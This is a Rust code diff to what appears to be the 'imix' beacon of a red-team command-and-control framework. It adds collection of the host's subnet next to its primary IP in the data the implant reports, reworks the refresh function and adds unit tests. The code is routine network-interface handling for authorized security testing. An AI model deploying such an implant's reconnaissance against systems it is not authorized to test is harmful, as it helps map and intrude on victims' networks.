@@ -242,11 +242,13 @@ impl Config {
 
         let selectors = parse_host_unique_selectors();
 
+        let (primary_ip, subnet) = get_primary_ip_and_subnet();
         let host = crate::c2::Host {
             name: whoami::fallible::hostname().unwrap_or(String::from("")),
             identifier: host_unique::get_id_with_selectors(selectors).to_string(),
             platform: get_host_platform() as i32,
-            primary_ip: get_primary_ip(),
+            primary_ip,
+            subnet,
         };
 
         let beacon_id =
@@ -282,27 +284,23 @@ impl Config {
         }
     }
 
-    pub fn refresh_primary_ip(&mut self) {
-        let fresh_ip = get_primary_ip();
-        if self
+    pub fn refresh_primary_ip_and_subnet(&mut self) {
+        let (primary_ip, subnet) = get_primary_ip_and_subnet();
+        match self
             .info
-            .clone()
-            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
+            .as_mut()
+            .ok_or("Beacon struct not initialized")
+            .and_then(|b| b.host.as_mut().ok_or("Host struct not initialized"))
         {
-            match self.info.clone() {
-                Some(mut b) => match b.host.as_mut() {
-                    Some(h) => {
-                        h.primary_ip = fresh_ip;
-                    }
-                    None => {
-                        #[cfg(feature = "print_debug")]
-                        log::error!("host struct was never initialized, failed to set primary ip");
-                    }
-                },
-                None => {
-                    #[cfg(feature = "print_debug")]
-                    log::error!("beacon struct was never initialized, failed to set primary ip");
+            Ok(host) => {
+                if host.primary_ip != primary_ip || host.subnet != subnet {
+                    host.primary_ip = primary_ip;
+                    host.subnet = subnet;
                 }
+            }
+            Err(e) => {
+                #[cfg(feature = "print_debug")]
+                log::error!("Failed to refresh primary IP and subnet: {}", e);
             }
         }
     }
@@ -329,33 +327,41 @@ fn get_host_platform() -> crate::c2::host::Platform {
 }
 
 #[cfg(not(target_os = "solaris"))]
-fn get_primary_ip() -> String {
+fn get_primary_ip_and_subnet() -> (String, String) {
     match netdev::get_default_interface() {
         Ok(default_interface) => match default_interface.ipv4.first() {
-            Some(ip) => ip.addr().to_string(),
-            None => String::from(""),
+            Some(ip) => ipv4_details(ip),
+            None => (String::new(), String::new()),
         },
         Err(_err) => {
             #[cfg(feature = "print_debug")]
             log::error!("failed to get primary ip: {_err}");
-            String::from("")
+            (String::new(), String::new())
         }
     }
 }
 
+#[cfg(not(target_os = "solaris"))]
+fn ipv4_details(ip: &netdev::ipnet::Ipv4Net) -> (String, String) {
+    (
+        ip.addr().to_string(),
+        format!("{}/{}", ip.network(), ip.prefix_len()),
+    )
+}
+
 #[cfg(target_os = "solaris")]
-fn get_primary_ip() -> String {
+fn get_primary_ip_and_subnet() -> (String, String) {
     use std::net::Ipv4Addr;
 
     let mut ifap: *mut libc::ifaddrs = std::ptr::null_mut();
     if unsafe { libc::getifaddrs(&mut ifap) } != 0 {
         #[cfg(feature = "print_debug")]
         log::error!("getifaddrs failed");
-        return String::from("");
+        return (String::new(), String::new());
     }
 
     let mut cursor = ifap;
-    let mut result = String::from("");
+    let mut result = (String::new(), String::new());
 
     while !cursor.is_null() {
         let entry = unsafe { &*cursor };
@@ -378,7 +384,15 @@ fn get_primary_ip() -> String {
                     };
 
                     let ip = Ipv4Addr::new(ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
-                    result = ip.to_string();
+                    let subnet = if entry.ifa_netmask.is_null() {
+                        String::new()
+                    } else {
+                        let netmask = unsafe { &*(entry.ifa_netmask as *const libc::sockaddr_in) };
+                        let mask = u32::from_be(netmask.sin_addr.s_addr);
+                        let network = Ipv4Addr::from(u32::from(ip) & mask);
+                        format!("{}/{}", network, mask.count_ones())
+                    };
+                    result = (ip.to_string(), subnet);
                     break;
                 }
             }
@@ -395,6 +409,35 @@ mod tests {
     use super::*;
 
     const DEFAULT_INTERVAL_SECONDS: u64 = 5;
+
+    #[cfg(not(target_os = "solaris"))]
+    #[test]
+    fn test_ipv4_details_uses_interface_prefix() {
+        let ip = "10.1.2.130/25".parse().unwrap();
+        assert_eq!(
+            ipv4_details(&ip),
+            ("10.1.2.130".into(), "10.1.2.128/25".into())
+        );
+    }
+
+    #[test]
+    fn test_refresh_primary_ip_and_subnet_updates_host() {
+        let mut config = Config {
+            info: Some(crate::c2::Beacon {
+                host: Some(crate::c2::Host {
+                    primary_ip: "stale".into(),
+                    subnet: "stale".into(),
+                    ..Default::default()
+                }),
+                ..Default::default()
+            }),
+            run_once: false,
+        };
+        let expected = get_primary_ip_and_subnet();
+        config.refresh_primary_ip_and_subnet();
+        let host = config.info.unwrap().host.unwrap();
+        assert_eq!((host.primary_ip, host.subnet), expected);
+    }
 
     fn default_rt() -> RuntimeImixConfig {
         RuntimeImixConfig::default()
@@ -585,6 +628,40 @@ mod tests {
         assert_eq!(
             transports[0].r#type,
             crate::c2::transport::Type::TransportQuic as i32
+        );
+    }
+
+    #[test]
+    fn test_refresh_primary_ip_and_subnet_persists_fresh_values() {
+        // Regression test for https://github.com/spellshift/realm/issues/2455:
+        // Refresh must persist the freshly resolved IP into the
+        // beacon config, so a transient bad read (e.g. 127.0.0.1 observed at
+        // startup) self-heals on the next agent cycle instead of sticking.
+        let live = get_primary_ip_and_subnet();
+        let mut cfg = Config {
+            info: Some(crate::c2::Beacon {
+                identifier: "test".to_string(),
+                principal: "test".to_string(),
+                host: Some(crate::c2::Host {
+                    name: "test".to_string(),
+                    identifier: "test".to_string(),
+                    platform: 0,
+                    primary_ip: "0.0.0.0-invalid".to_string(),
+                    subnet: "0.0.0.0/0-invalid".to_string(),
+                }),
+                agent: Some(crate::c2::Agent {
+                    identifier: "test".to_string(),
+                }),
+                available_transports: None,
+            }),
+            run_once: false,
+        };
+        cfg.refresh_primary_ip_and_subnet();
+        let stored = cfg.info.as_ref().unwrap().host.as_ref().unwrap();
+        assert_eq!(
+            (&stored.primary_ip, &stored.subnet),
+            (&live.0, &live.1),
+            "refresh did not persist the fresh primary IP and subnet"
         );
     }
 }
